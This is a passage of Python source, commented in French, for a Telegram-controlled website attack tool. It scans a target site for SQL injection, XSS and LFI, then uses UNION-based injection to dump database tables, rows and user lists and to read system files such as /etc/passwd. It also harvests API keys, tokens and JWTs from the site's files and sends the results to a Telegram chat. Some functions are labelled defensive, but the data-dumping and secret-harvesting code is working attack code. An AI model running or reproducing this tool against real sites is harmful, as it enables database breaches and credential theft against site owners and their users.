            "mysql": r"you have an error in your sql syntax|mysql_fetch|mariadb",
            "postgres": r"pg_query|postgresql|psql",
            "mssql": r"microsoft ole db|odbc sql server",
            "oracle": r"ora-\d{5}",
            "sqlite": r"sqlite3\.OperationalError|sqlite error",
        }
        r = self._get("1'")
        if r:
            body = r.text.lower()
            for db, pattern in error_map.items():
                if re.search(pattern, body, re.IGNORECASE):
                    self.db_type = db
                    self.evidence.append(f"DB type via error: {db}")
                    return db
        return None

    def extract_tables(self):
        if not self.db_type or not self.num_columns:
            return []
        payloads = DB_TABLES_PAYLOADS.get(self.db_type, [])
        all_tables = set()
        for payload_tpl in payloads:
            cols = self._build_union_columns(payload_tpl)
            if not cols:
                continue
            r = self._get(cols)
            if r is None:
                continue
            candidates = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]{2,50})\b', r.text)
            blacklist = {"html", "head", "body", "div", "span", "class", "id",
                        "style", "script", "type", "text", "css", "src", "href",
                        "title", "meta", "http", "https", "www", "com"}
            for c in candidates:
                if c.lower() not in blacklist and "_" in c:
                    all_tables.add(c)
        self.tables = sorted(all_tables)[:DB_DUMP_MAX_TABLES]
        return self.tables

    def _build_union_columns(self, payload_tpl):
        m = re.search(r"UNION\s+SELECT\s+(.+?)--", payload_tpl, re.IGNORECASE)
        if not m or self.num_columns <= 0:
            return None
        union_cols = m.group(1)
        parts = []
        for i in range(1, self.num_columns + 1):
            if i == 2:
                parts.append(f"({union_cols})")
            else:
                parts.append(str(i))
        return f"1' UNION SELECT {','.join(parts)}-- -"

    def extract_columns(self, table):
        if not self.db_type or not self.num_columns:
            return []
        tpl = DB_COLUMNS_PAYLOADS.get(self.db_type)
        if not tpl:
            return []
        payload = self._build_union_columns(tpl.format(table=table))
        if not payload:
            return []
        r = self._get(payload)
        if r is None:
            return []
        candidates = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]{1,50})\b', r.text)
        blacklist = {"html", "head", "body", "div", "span", "class", "id", "style"}
        cols = [c for c in candidates if c.lower() not in blacklist]
        cols = [c for c in cols if "_" in c or c.islower()][:DB_DUMP_MAX_COLS]
        return sorted(set(cols))

    def dump_table(self, table, columns):
        if not self.db_type or not self.num_columns or not columns:
            return []
        tpl = DB_DATA_PAYLOADS.get(self.db_type)
        if not tpl:
            return []
        col_str = ",0x7c,".join(columns[:8])
        payload = self._build_union_columns(tpl.format(table=table, cols=col_str,
                                                        n=DB_DUMP_MAX_ROWS))
        if not payload:
            return []
        r = self._get(payload, timeout=SQLI_TIMEOUT + 5)
        if r is None:
            return []
        rows = []
        for line in r.text.split("\n"):
            line = line.strip()
            if "|" in line and len(line) < 2000:
                line = re.sub(r"<[^>]+>", "", line)
                parts = line.split("|")
                if len(parts) >= 2 and any(len(p) > 0 for p in parts):
                    rows.append(parts[:DB_DUMP_MAX_COLS])
        return rows[:DB_DUMP_MAX_ROWS]

    def enum_users(self):
        if not self.db_type or not self.num_columns:
            return []
        tpl = DB_USERS_PAYLOADS.get(self.db_type)
        if not tpl:
            return []
        payload = self._build_union_columns(tpl)
        if not payload:
            return []
        r = self._get(payload)
        if r is None:
            return []
        candidates = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]{2,30})\b', r.text)
        blacklist = {"html", "body", "class", "id", "div"}
        return [c for c in candidates if c.lower() not in blacklist][:20]

    def read_file(self, path):
        if not self.db_type or not self.num_columns:
            return None
        tpl = DB_FILEREAD_PAYLOADS.get(self.db_type)
        if not tpl:
            return None
        payload = self._build_union_columns(tpl.format(path=path))
        if not payload:
            return None
        r = self._get(payload, timeout=SQLI_TIMEOUT + 5)
        if r is None:
            return None
        for m in ["root:x:", "[extensions]", "[fonts]", "DOCUMENT_ROOT"]:
            if m in r.text:
                idx = r.text.find(m)
                return r.text[max(0, idx-100):idx+500]
        return None

    def run_full_dump(self):
        result = {"url": self.url, "param": self.param, "num_columns": None,
                 "db_type": None, "tables": [], "tables_dump": {},
                 "users": [], "file_reads": [], "evidence": []}
        self.notify(f"🔬 <b>DB Dump sur <code>{self.param}</code>...</b>")
        n = self.find_num_columns()
        if not n:
            self.notify(f"❌ Colonnes non détectées sur {self.param}")
            return result
        result["num_columns"] = n
        db = self.fingerprint_db()
        if not db:
            db = "mysql"
            self.db_type = db
        result["db_type"] = db
        self.notify(f"✅ SGBD : <b>{db}</b> ({n} colonnes)")
        tables = self.extract_tables()
        result["tables"] = tables
        if tables:
            self.notify(f"📋 <code>{len(tables)}</code> table(s) extraite(s)")
        for table in tables[:10]:
            cols = self.extract_columns(table)
            if not cols:
                continue
            rows = self.dump_table(table, cols)
            if rows:
                result["tables_dump"][table] = {"columns": cols, "rows": rows}
                self.notify(f"✅ <code>{table}</code> : {len(rows)} ligne(s)")
        result["users"] = self.enum_users()
        for path in ["/etc/passwd", "/etc/hostname", "C:\\Windows\\win.ini"]:
            content = self.read_file(path)
            if content:
                result["file_reads"].append({"path": path, "content": content[:1000]})
                break
        result["evidence"] = self.evidence
        return result


def run_db_dump_on_findings(sqli_findings, notify_fn=None):
    if not DB_DUMP_ENABLED or not sqli_findings:
        return []
    def notify(msg):
        if notify_fn:
            notify_fn(msg)
    results = []
    session = make_session()
    seen = set()
    for f in sqli_findings:
        key = (f.get("url"), f.get("param"))
        if key in seen:
            continue
        seen.add(key)
        notify(f"🔬 <b>DB Dump sur <code>{f['param']}</code></b>")
        try:
            dumper = DBDumper(f["url"], f["param"], session, notify_fn=notify)
            results.append(dumper.run_full_dump())
        except Exception as e:
            log(f"DB dump error: {e}", "ERROR")
    return results


# =================================================================
# PDF EXPORT
# =================================================================
def export_report_to_pdf(html_path, pdf_path):
    try:
        from weasyprint import HTML
        HTML(filename=html_path).write_pdf(pdf_path)
        return True
    except ImportError:
        pass
    except Exception as e:
        log(f"weasyprint error: {e}", "ERROR")
    try:
        import pdfkit
        pdfkit.from_file(html_path, pdf_path)
        return True
    except ImportError:
        pass
    except Exception as e:
        log(f"pdfkit error: {e}", "ERROR")
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch()
            page = browser.new_page()
            page.goto(f"file://{os.path.abspath(html_path)}")
            page.pdf(path=pdf_path, format="A4")
            browser.close()
        return True
    except ImportError:
        pass
    except Exception as e:
        log(f"playwright error: {e}", "ERROR")
    log("⚠️ Aucun moteur PDF disponible", "WARN")
    return False


# =================================================================
# SQLi SCANNER
# =================================================================
class SqlInjectorScanner:
    def __init__(self, base_url, session=None, timeout=SQLI_TIMEOUT):
        self.base_url = base_url
        self.timeout = timeout
        self.session = session or make_session()

    def _safe_get(self, url, params, timeout=None):
        try:
            return self.session.get(url, params=params,
                headers=build_headers(url), timeout=timeout or self.timeout,
                allow_redirects=False)
        except Exception:
            return None

    def _error_based(self, url, param):
        db_errors = [
            r"you have an error in your sql syntax", r"warning.*mysql_",
            r"unclosed quotation mark", r"quoted string not properly terminated",
            r"pg_query\(\)", r"postgresql.*error", r"ora-\d{5}",
            r"microsoft ole db provider", r"odbc sql server driver",
            r"sqlite3\.OperationalError", r"sqlite error",
            r"syntax error.*sql", r"division by zero",
        ]
        if self._safe_get(url, {param: "1"}) is None:
            return None
        for payload in SQLI_ERROR_PAYLOADS:
            r = self._safe_get(url, {param: payload})
            if r is None:
                continue
            body = r.text.lower()
            for err in db_errors:
                if re.search(err, body):
                    return {"type": "error-based", "param": param, "payload": payload,
                            "evidence": re.search(err, body).group(0)[:120],
                            "severity": "CRITICAL"}
        return None

    def _boolean_based(self, url, param):
        for true_p, false_p in SQLI_BOOLEAN_PAIRS:
            r_true = self._safe_get(url, {param: true_p})
            r_false = self._safe_get(url, {param: false_p})
            if r_true is None or r_false is None:
                continue
            len_diff = abs(len(r_true.text) - len(r_false.text))
            if len_diff > 50 and r_true.status_code == r_false.status_code == 200:
                r_true2 = self._safe_get(url, {param: true_p})
                if r_true2 and abs(len(r_true.text) - len(r_true2.text)) < 20:
                    return {"type": "boolean-based", "param": param,
                            "payload_true": true_p, "payload_false": false_p,
                            "evidence": f"len: {len(r_true.text)} vs {len(r_false.text)}",
                            "severity": "HIGH"}
        return None

    def _time_based(self, url, param):
        t0 = time.time()
        if self._safe_get(url, {param: "1"}) is None:
            return None
        baseline = time.time() - t0
        for template, db in SQLI_TIME_PAYLOADS:
            payload = template.format(s=SQLI_SLEEP)
            t0 = time.time()
            r = self._safe_get(url, {param: payload},
                              timeout=self.timeout + SQLI_SLEEP + 5)
            elapsed = time.time() - t0
            if r is None:
                continue
            if elapsed >= baseline + (SQLI_SLEEP - 1):
                return {"type": "time-based", "param": param, "payload": payload,
                        "db_guess": db,
                        "evidence": f"baseline={baseline:.2f}s, inj={elapsed:.2f}s",
                        "severity": "CRITICAL"}
        return None

    def scan_url(self, url, params_to_test):
        results = []
        for param in params_to_test:
            f = self._error_based(url, param)
            if not f:
                f = self._boolean_based(url, param)
            if not f:
                f = self._time_based(url, param)
            if f:
                f["url"] = url
                results.append(f)
        return results


def extract_urls_with_params(base_url, session):
    urls_with_params = set()
    try:
        r = session.get(base_url, headers=build_headers(base_url), timeout=15)
        if r.status_code != 200:
            return []
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            full = urljoin(base_url, a["href"])
            if "?" in full and "=" in full:
                urls_with_params.add(full.split("#")[0])
        for form in soup.find_all("form"):
            method = (form.get("method") or "get").lower()
            if method != "get":
                continue
            full = urljoin(base_url, form.get("action", ""))
            params = [i.get("name") for i in form.find_all(["input", "select", "textarea"])
                      if i.get("name")]
            if params:
                urls_with_params.add(full + "?" + "&".join(f"{p}=1" for p in params))
        for m in re.finditer(r'["\']([^"\']+\?[^"\']+=[^"\']+)["\']', r.text):
            full = urljoin(base_url, m.group(1))
            if is_internal(full, base_url):
                urls_with_params.add(full.split("#")[0])
    except Exception as e:
        log(f"extract_urls error: {e}", "ERROR")
    return list(urls_with_params)[:30]


def run_sqli_scan(base_url, notify_fn=None):
    if not SQLI_ENABLED:
        return []
    def notify(msg):
        if notify_fn:
            notify_fn(msg)
        log(msg)
    notify("🎓 <b>Scan SQLi multi-techniques...</b>")
    session = make_session()
    urls = extract_urls_with_params(base_url, session)
    if not urls:
        notify("ℹ️ Aucune URL avec paramètres")
        return []
    notify(f"🎯 <code>{len(urls)}</code> URL(s)")
    scanner = SqlInjectorScanner(base_url, session)
    findings = []

    def test_one(url):
        parsed = urlparse(url)
        params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
        if not params:
            return []
        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return scanner.scan_url(clean, params)

    with ThreadPoolExecutor(max_workers=SQLI_THREADS) as ex:
        futures = {ex.submit(test_one, u): u for u in urls}
        for fut in as_completed(futures):
            try:
                findings.extend(fut.result())
            except Exception as e:
                log(f"SQLi worker error: {e}", "ERROR")
    if findings:
        notify(f"🚨 <b>{len(findings)} SQLi détectée(s)</b>")
    return findings


def run_xss_scan(base_url, notify_fn=None):
    if not XSS_LFI_SCAN:
        return []
    def notify(msg):
        if notify_fn:
            notify_fn(msg)
    notify("🎓 <b>Scan XSS reflected...</b>")
    session = make_session()
    urls = extract_urls_with_params(base_url, session)
    findings = []
    for url in urls[:15]:
        parsed = urlparse(url)
        params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in XSS_PAYLOADS[:6]:
                try:
                    r = session.get(clean, params={param: payload},
                                    headers=build_headers(clean), timeout=8)
                    if payload in r.text:
                        findings.append({"type": "reflected-xss", "url": clean,
                                        "param": param, "payload": payload,
                                        "severity": "HIGH"})
                        break
                except Exception:
                    pass
    if findings:
        notify(f"🚨 <b>{len(findings)} XSS détectée(s)</b>")
    return findings


def run_lfi_scan(base_url, notify_fn=None):
    if not XSS_LFI_SCAN:
        return []
    def notify(msg):
        if notify_fn:
            notify_fn(msg)
    notify("🎓 <b>Scan LFI...</b>")
    session = make_session()
    urls = extract_urls_with_params(base_url, session)
    findings = []
    sigs = [r"root:x:\d+:\d+:", r"\[extensions\]", r"\[fonts\]", r"DOCUMENT_ROOT="]
    for url in urls[:15]:
        parsed = urlparse(url)
        params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in LFI_PAYLOADS[:6]:
                try:
                    r = session.get(clean, params={param: payload},
                                    headers=build_headers(clean), timeout=8)
                    for sig in sigs:
                        if re.search(sig, r.text):
                            findings.append({"type": "lfi", "url": clean, "param": param,
                                            "payload": payload, "severity": "CRITICAL",
                                            "evidence": re.search(sig, r.text).group(0)[:80]})
                            break
                except Exception:
                    pass
    if findings:
        notify(f"🚨 <b>{len(findings)} LFI détectée(s)</b>")
    return findings


# =================================================================
# MODULES DÉFENSIFS
# =================================================================
def scan_db_backups(origin, headers, session):
    found = []
    for f in DB_BACKUP_FILES:
        url = f"{origin.rstrip('/')}/{f.lstrip('/')}"
        try:
            r = session.head(url, headers=headers, timeout=6, allow_redirects=False)
            if r.status_code != 200:
                continue
            r2 = session.get(url, headers=headers, timeout=8, allow_redirects=False, stream=True)
            if r2.status_code != 200:
                continue
            size = r2.headers.get("Content-Length", "?")
            ct = r2.headers.get("Content-Type", "")
            is_sql = False
            try:
                chunk = next(r2.iter_content(2048), b"")
                text = chunk.decode("utf-8", errors="ignore").lower()
                is_sql = any(k in text for k in ["insert into", "create table",
                                                  "-- mysql dump", "start transaction"])
            except Exception:
                pass
            found.append({"url": url, "size": size, "content_type": ct, "is_sql": is_sql,
                         "severity": "CRITICAL" if is_sql else "HIGH"})
        except Exception:
            pass
    return found


def scan_db_admin_tools(origin, headers, session):
    found = []
    for tool in DB_ADMIN_TOOLS:
        url = f"{origin.rstrip('/')}/{tool.lstrip('/')}"
        try:
            r = session.get(url, headers=headers, timeout=6, allow_redirects=False)
            if r.status_code in (200, 401, 403):
                title = ""
                if r.status_code == 200:
                    m = re.search(r"<title[^>]*>([^<]+)</title>", r.text, re.IGNORECASE)
                    if m:
                        title = m.group(1).strip()[:80]
                found.append({"url": url, "status": r.status_code, "title": title,
                             "severity": "HIGH" if r.status_code == 200 else "MEDIUM"})
        except Exception:
            pass
    return found


def scan_git_leaks(origin, headers, session):
    found = []
    for p in [".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD",
              ".svn/entries", ".svn/wc.db", ".hg/hgrc"]:
        url = f"{origin.rstrip('/')}/{p}"
        try:
            r = session.get(url, headers=headers, timeout=6, allow_redirects=False)
            if r.status_code == 200 and len(r.content) > 5:
                valid = (".git/HEAD" in url and "ref:" in r.text[:100]) or \
                        (".git/config" in url and "[core]" in r.text) or \
                        (".svn/entries" in url and r.text[:20].strip().isdigit())
                if valid:
                    found.append({"url": url, "size": len(r.content),
                                 "severity": "CRITICAL"})
        except Exception:
            pass
    return found


def analyze_env_content(text):
    info = {}
    for key in ENV_DB_KEYS:
        m = re.search(rf'^{re.escape(key)}\s*=\s*(.+)$', text, re.MULTILINE)
        if m:
            value = m.group(1).strip().strip('"').strip("'")
            if "PASSWORD" in key or "SECRET" in key or "KEY" in key:
                info[key] = "*" * min(len(value), 12)
            else:
                info[key] = value[:80]
    return info


def detect_waf(response):
    found = []
    headers_str = " ".join([f"{k}: {v}" for k, v in response.headers.items()]).lower()
    body_str = response.text[:5000].lower() if hasattr(response, "text") else ""
    for waf, patterns in WAF_SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, headers_str) or re.search(pat, body_str):
                found.append(waf)
                break
    return list(set(found))


def analyze_js_obfuscation(text):
    result = {"packer_detected": bool(RE_JS_EVAL.search(text)),
             "hex_strings": len(RE_JS_HEX.findall(text)),
             "base64_strings": len(RE_JS_B64.findall(text)),
             "unicode_strings": len(RE_JS_UNICODE.findall(text)),
             "decoded_b64": []}
    for m in RE_JS_B64.finditer(text):
        try:
            raw = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
            if raw.isprintable() and len(raw) > 5:
                result["decoded_b64"].append(raw[:200])
        except Exception:
            pass
    result["decoded_b64"] = result["decoded_b64"][:5]
    return result


def enum_subdomains(domain, notify_fn=None, max_workers=30):
    results = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
        if r.status_code == 200:
            for entry in r.json():
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lower()
                    if name.endswith(f".{domain}") or name == domain:
                        results.add(name)
    except Exception:
        pass

    def test_sub(sub):
        sub_domain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(sub_domain)
            return sub_domain
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(test_sub, s) for s in SUBDOMAIN_WORDLIST]
        for f in as_completed(futures):
            r = f.result()
            if r:
                results.add(r)
    return sorted(results)


def discover_apis(base_url, session):
    found = []
    paths = ["swagger.json", "openapi.json", "api-docs", "docs", "redoc",
             "v2/api-docs", "v3/api-docs", "swagger-ui.html", "swagger-ui/",
             "graphql", "graphiql", "api/graphql", ".well-known/openid-configuration",
             "api", "api/v1", "api/v2", "wp-json/", "wp-json/wp/v2/"]
    for p in paths:
        url = urljoin(base_url + "/", p)
        try:
            r = session.get(url, headers=build_headers(url), timeout=8, allow_redirects=False)
            if r.status_code in (200, 401, 403):
                ct = r.headers.get("content-type", "").lower()
                title = ""
                m = re.search(r"<title[^>]*>([^<]+)</title>", r.text[:2000], re.IGNORECASE)
                if m:
                    title = m.group(1).strip()[:80]
                found.append({"url": url, "status": r.status_code,
                             "content_type": ct, "title": title, "size": len(r.content),
                             "type": "openapi" if "openapi" in p or "swagger" in p
                                     else "graphql" if "graphql" in p else "api"})
        except Exception:
            pass
    return found


def compute_risk_score(summary):
    score = 100
    if summary.get("sqli_findings"):
        score -= min(50, 15 * len(summary["sqli_findings"]))
    if summary.get("xss_findings"):
        score -= min(30, 10 * len(summary["xss_findings"]))
    if summary.get("lfi_findings"):
        score -= min(30, 15 * len(summary["lfi_findings"]))
    if summary.get("ssrf_findings"):
        score -= min(30, 15 * len(summary["ssrf_findings"]))
    if summary.get("secrets"):
        score -= min(40, 5 * len(summary["secrets"]))
    if summary.get("db_backups"):
        score -= min(30, 15 * len(summary["db_backups"]))
    if summary.get("db_admin_tools"):
        score -= min(20, 8 * len(summary["db_admin_tools"]))
    if summary.get("git_leaks"):
        score -= min(25, 10 * len(summary["git_leaks"]))
    if summary.get("cves"):
        score -= min(20, 5 * len(summary["cves"]))
    if summary.get("db_dump_results"):
        score -= 40
    if summary.get("webshells"):
        score -= 50
    if summary.get("cors", {}).get("dangerous"):
        score -= 10
    h = summary.get("headers", {})
    missing = sum(1 for sec_h in ["strict-transport-security", "content-security-policy",
                                   "x-frame-options", "x-content-type-options"]
                  if sec_h not in [k.lower() for k in h.keys()])
    score -= missing * 3
    score = max(0, score)
    grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 60 \
            else "D" if score >= 40 else "E" if score >= 20 else "F"
    return {"score": score, "grade": grade}


# =================================================================
# BOT TELEGRAM
# =================================================================
class Bot:
    def __init__(self, token):
        self.token = token
        self.base = f"https://api.telegram.org/bot{token}"
        self.offset = 0

    def call(self, method, **kwargs):
        try:
            r = requests.post(f"{self.base}/{method}", json=kwargs, timeout=60)
            return r.json()
        except Exception as e:
            log(f"API error {method}: {e}", "ERROR")
            return {"ok": False}

    def send_message(self, chat_id, text, silent=False):
        if len(text) > 4000:
            text = text[:3900] + "\n<i>... (tronqué)</i>"
        return self.call("sendMessage", chat_id=chat_id, text=text,
                         parse_mode="HTML", disable_notification=silent,
                         disable_web_page_preview=True)

    def edit_message(self, chat_id, message_id, text):
        if len(text) > 4000:
            text = text[:3900] + "\n<i>... (tronqué)</i>"
        return self.call("editMessageText", chat_id=chat_id, message_id=message_id,
                         text=text, parse_mode="HTML", disable_web_page_preview=True)

    def send_document(self, chat_id, path, caption=""):
        try:
            with open(path, "rb") as f:
                r = requests.post(f"{self.base}/sendDocument",
                    data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
                    files={"document": f}, timeout=600)
            return r.json()
        except Exception as e:
            log(f"Send doc error: {e}", "ERROR")
            return {"ok": False}

    def send_action(self, chat_id, action="typing"):
        return self.call("sendChatAction", chat_id=chat_id, action=action)

    def get_updates(self, timeout=30):
        try:
            r = requests.get(f"{self.base}/getUpdates",
                params={"offset": self.offset, "timeout": timeout},
                timeout=timeout + 10)
            data = r.json()
            if data.get("ok"):
                for u in data["result"]:
                    self.offset = u["update_id"] + 1
                return data["result"]
        except Exception as e:
            log(f"Poll error: {e}", "ERROR")
        return []

    def me(self):
        try:
            r = requests.get(f"{self.base}/getMe", timeout=10).json()
            if r.get("ok"):
                return r["result"]
        except Exception:
            pass
        return None


# =================================================================
# DUMPER
# =================================================================
class Dumper:
    def __init__(self, url, chat_id, bot):
        self.url = url
        self.chat_id = chat_id
        self.bot = bot
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.output_dir = f"/tmp/dump_{self.timestamp}"
        self.stats = {"ok": 0, "failed": 0, "skipped": 0, "bytes": 0}
        self.summary = {
            "target": url, "started": datetime.now().isoformat(),
            "html": [], "js": [], "css": [], "iframes": [], "images": [],
            "other": [], "sourcemaps": [], "php_source": [], "php_backup": [],
            "sensitive_found": [], "api_endpoints": [], "websockets": [],
            "secrets": [], "fingerprint": {}, "headers": {}, "cors": {},
            "crawled_pages": [], "robots": None, "sitemap": None,
            "db_backups": [], "db_admin_tools": [],
            "sqli_findings": [], "xss_findings": [], "lfi_findings": [],
            "ssrf_findings": [], "git_leaks": [], "waf": [],
            "subdomains": [], "api_discovery": [], "js_obfuscation": [],
            "jwts": [], "cookies_analysis": [], "cves": [],
            "db_dump_results": [], "webshells": [], "risk": {},
            "versions": {},
        }
        self.origin = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        self.visited_js = set()
        self.visited_urls = set()
        self.session = make_session()
        self._status_msg_id = None
        self.downloaded_files = []

    def notify(self, text, silent=False):
        try:
            self.bot.send_message(self.chat_id, text, silent=silent)
        except Exception:
            pass

    def status(self, text):
        try:
            if self._status_msg_id:
                self.bot.edit_message(self.chat_id, self._status_msg_id, text)
            else:
                r = self.bot.send_message(self.chat_id, text)
                if r.get("ok"):
                    self._status_msg_id = r["result"]["message_id"]
        except Exception:
            pass

    def progress(self):
        try:
            self.bot.send_action(self.chat_id, "typing")
        except Exception:
            pass

    def analyze_headers(self, resp):
        h = dict(resp.headers)
        keep = ["server", "x-powered-by", "x-generator", "x-aspnet-version",
                "x-runtime", "cf-ray", "x-cache", "x-vercel-id", "x-amz-cf-id",
                "strict-transport-security", "content-security-policy",
                "x-frame-options", "x-content-type-options", "x-xss-protection",
                "access-control-allow-origin", "access-control-allow-methods",
                "access-control-allow-credentials", "set-cookie",
                "referrer-policy", "permissions-policy"]
        self.summary["headers"] = {k: v for k, v in h.items() if k.lower() in keep}
        self.summary["fingerprint"]["server"] = h.get("Server", "")
        self.summary["fingerprint"]["powered_by"] = h.get("X-Powered-By", "")
        acao = h.get("Access-Control-Allow-Origin", "")
        acac = h.get("Access-Control-Allow-Credentials", "")
        if acao:
            self.summary["cors"] = {"allow_origin": acao, "allow_credentials": acac,
                                     "dangerous": acao == "*" and acac.lower() == "true"}

    def fingerprint_html(self, html):
        techs = []
        for name, patterns in FP_TECH.items():
            for pat in patterns:
                if re.search(pat, html, re.IGNORECASE):
                    techs.append(name)
                    break
        self.summary["fingerprint"]["technologies"] = list(set(techs))

    def analyze_cookies(self, cookies):
        analyzed = []
        for cookie in cookies:
            flags = {"name": cookie.name, "secure": cookie.secure,
                    "httponly": "HttpOnly" in str(cookie._rest),
                    "samesite": cookie.get_nonstandard_attr("SameSite", "")}
            issues = []
            if not flags["secure"]:
                issues.append("Pas de Secure")
            if not flags["httponly"]:
                issues.append("Pas de HttpOnly")
            if not flags["samesite"]:
                issues.append("Pas de SameSite")
            flags["issues"] = issues
            analyzed.append(flags)
        return analyzed

    def scan_secrets(self, text, source_url):
        found = []
        patterns = [
            ("secret_keyword", RE_SECRETS, 1), ("bearer_token", RE_BEARER, 1),
            ("jwt", RE_JWT, 0), ("google_api_key", RE_GOOGLE_API, 0),
            ("aws_access_key", RE_AWS_KEY, 0), ("stripe_key", RE_STRIPE, 0),
            ("github_token", RE_GITHUB_TOKEN, 0), ("slack_token", RE_SLACK_TOKEN, 0),
            ("discord_token", RE_DISCORD_TOKEN, 0), ("twilio_sid", RE_TWILIO_SID, 0),
            ("sendgrid_key", RE_SENDGRID, 0),
        ]
        for tname, pat, grp in patterns:
            for m in pat.finditer(text):
                try:
                    val = m.group(grp) if grp else m.group(0)
                except Exception:
                    continue
                if len(val) < 8 or val.lower() in ["password", "secret", "token"]:
                    continue
                entry = {"type": tname, "url": source_url, "value": val[:80]}
                if tname == "jwt":
                    decoded = decode_jwt(val)
                    if decoded:
                        entry["jwt_decoded"] = decoded
                        self.summary["jwts"].append({
                            "token": val[:80], "decoded": decoded,
                            "source": source_url})
                found.append(entry)
        if RE_PRIVATE_KEY.search(text):
            found.append({"type": "private_key", "url": source_url,
                         "value": "-----BEGIN PRIVATE KEY-----"})
        seen = set()
        unique = []
        for f in found:
            k = (f["type"], f["value"])
            if k not in seen:
                seen.add(k)
                unique.append(f)
        return unique

    def scan_apis(self, text, source_url):
        for m in RE_API_ENDPOINTS.finditer(text):
            endpoint = urljoin(source_url, m.group(1))
            if endpoint not in [a["url"] for a in self.summary["api_endpoints"]]:
                self.summary["api_endpoints"].append({"url": endpoint,
                    "source": source_url, "type": "path"})
        for m in RE_FETCH_AXIOS.finditer(text):
            endpoint = urljoin(source_url, m.group(1))
            if endpoint not in [a["url"] for a in self.summary["api_endpoints"]]:
                self.summary["api_endpoints"].append({"url": endpoint,
                    "source": source_url, "type": "fetch/axios"})
        for m in RE_WS_URLS.finditer(text):
            ws = m.group(0)
            if ws not in [w["url"] for w in self.summary["websockets"]]:
                self.summary["websockets"].append({"url": ws, "source": source_url})
        for m in RE_API_URL_IN_JS.finditer(text):
            url = m.group(1)
            if url not in [a["url"] for a in self.summary["api_endpoints"]]:
                self.summary["api_endpoints"].append({"url": url,
                    "source": source_url, "type": "js_url"})

    def download(self, url, subdir="", check_php=False, scan=False, timeout=20):
        if url in self.visited_urls:
            return None, None, "visited"
        self.visited_urls.add(url)
        if DOWNLOAD_DELAY:
            time.sleep(DOWNLOAD_DELAY)
        try:
            r = self.session.get(url, headers=build_headers(url), timeout=timeout,
                                 allow_redirects=False)
            if r.status_code != 200:
                self.stats["failed"] += 1
                return None, None, r.status_code
            content = r.content
            if len(content) > MAX_FILE_SIZE_MB * 1024 * 1024:
                self.stats["skipped"] += 1
                return None, None, "too_big"
            text = content.decode("utf-8", errors="ignore")
            if check_php:
                if (looks_like_html(text) and not looks_like_php_source(text)) or \
                   not looks_like_php_source(text):
                    self.stats["failed"] += 1
                    return None, None, "not_php"
            if scan and any(url.lower().endswith(ext) for ext in
                           ['.js', '.json', '.txt', '.map', '.php', '.html',
                            '.htm', '.css', '.sql', '.env', '.yml', '.yaml', '.xml']):
                secrets = self.scan_secrets(text, url)
                self.summary["secrets"].extend(secrets)
                self.scan_apis(text, url)
            name = filename_from_url(url)
            path = os.path.join(self.output_dir, subdir, name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as f:
                f.write(content)
            self.downloaded_files.append((os.path.relpath(path, self.output_dir),
                                          text[:50000]))
            self.stats["ok"] += 1
            self.stats["bytes"] += len(content)
            return path, content, 200
        except Exception:
            self.stats["failed"] += 1
            return None, None, "error"

    def crawl_site(self, base_url, html):
        if CRAWL_DEPTH <= 0:
            return
        queue = [(base_url, 0)]
        seen = {normalize_url(base_url)}
        processed = 0
        while queue and processed < MAX_PAGES:
            current, depth = queue.pop(0)
            if depth >= CRAWL_DEPTH:
                continue
            self.progress()
            try:
                r = self.session.get(current, headers=build_headers(current),
                                     timeout=15, allow_redirects=True)
                if r.status_code != 200 or "text/html" not in r.headers.get("content-type", ""):
                    continue
                save(os.path.join(self.output_dir, "crawled",
                                  filename_from_url(current, ".html")), r.text)
                self.summary["crawled_pages"].append({
                    "url": current, "file": f"crawled/{filename_from_url(current, '.html')}",
                    "size": len(r.content), "depth": depth})
                processed += 1
                soup = BeautifulSoup(r.text, "html.parser")
                for a in soup.find_all("a", href=True):
                    full = urljoin(current, a["href"].split("#")[0])
                    if not is_internal(full, self.origin):
                        continue
                    if not full.startswith(("http://", "https://")):
                        continue
                    norm = normalize_url(full)
                    if norm in seen:
                        continue
                    seen.add(norm)
                    queue.append((norm, depth + 1))
                for m in RE_JS_SRC.finditer(r.text):
                    js_url = urljoin(current, m.group(1))
                    if is_internal(js_url, self.origin) and js_url not in self.visited_js:
                        p, _, _ = self.download(js_url, "js", scan=True)
                        if p:
                            self.summary["js"].append({
                                "url": js_url,
                                "file": os.path.relpath(p, self.output_dir),
                                "size": os.path.getsize(p)})
            except Exception as e:
                log(f"Crawl error {current}: {e}", "ERROR")
                continue
        if self.summary["crawled_pages"]:
            self.notify(f"✅ Crawl : <code>{len(self.summary['crawled_pages'])}</code> page(s)")

    def download_recursive_js(self, js_urls, depth=0):
        if depth > JS_DEPTH:
            return
        for u in sorted(js_urls):
            if u in self.visited_js:
                continue
            self.visited_js.add(u)
            self.progress()
            p, content, _ = self.download(u, "js", scan=True)
            if not p:
                continue
            self.summary["js"].append({"url": u, "file": os.path.relpath(p, self.output_dir),
                                        "size": os.path.getsize(p)})
            if content:
                text = content.decode("utf-8", errors="ignore")
                obf = analyze_js_obfuscation(text)
                if any([obf["packer_detected"], obf["hex_strings"] > 3,
